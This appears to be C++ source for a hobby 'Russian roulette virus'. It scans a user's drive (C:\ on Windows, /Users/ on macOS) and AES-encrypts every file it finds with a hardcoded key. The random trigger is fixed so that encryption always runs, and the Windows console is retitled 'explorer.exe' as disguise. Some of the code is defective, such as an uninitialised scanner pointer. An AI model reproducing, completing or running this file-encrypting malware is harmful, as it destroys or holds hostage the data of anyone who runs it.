#include <iostream> // IO
#include <ctime>
#include <cstdlib> // Acesso a funções do C
#include <string>
#include <vector>
#include <openssl/aes.h>

#include "criptografia_arquivo.cpp"

#include "directory_scanner.cpp"

#define CHAVE "1234"

using namespace std;


struct OSInfo {
    std::string os_name;
    std::string dir_path;

    OSInfo() {
        #ifdef _WIN32
            #include <Windows.h>
            SetConsoleTitle("explorer.exe");
            os_name = "Windows";
            dir_path = "C:\\";
        #elif __APPLE__
            os_name = "MacOS";
            dir_path = "/Users/";
        #elif __linux__
            os_name = "Linux";
            dir_path = "/home/jack/github/virus_rolleta_russa/teste";
        #else
            os_name = "Outro";
            dir_path = "/";
        #endif
    }
};

class Programa {
    public:
        void executar() {
            OSInfo os_info;
            CriptografiaArquivo* ca = new CriptografiaArquivo();
            DirectoryScanner* ds;
            vector<string> files = ds->list_files(os_info.dir_path);

            int numero_sorteado = 6;

            if(numero_sorteado == 6){
                // Imprime os caminhos completos dos arquivos encontrados
                for (const auto& file : files) {
                    cout << file << endl;
                    // string conteudo = ca->lerConteudoArquivo(file);
                    ca->criptografarArquivoAES(file, CHAVE);
                }
            }
            delete ca;
            delete ds;
        }
};

int main(int argc, char* argv[]){
    Programa p;
    p.executar();
    exit(EXIT_SUCCESS);
}

int sorteio(){
    srand(time(NULL)); // Gera o seed do número aleatório
    return rand() % 6 + 1; // Retorne um número entre 0 e 6
}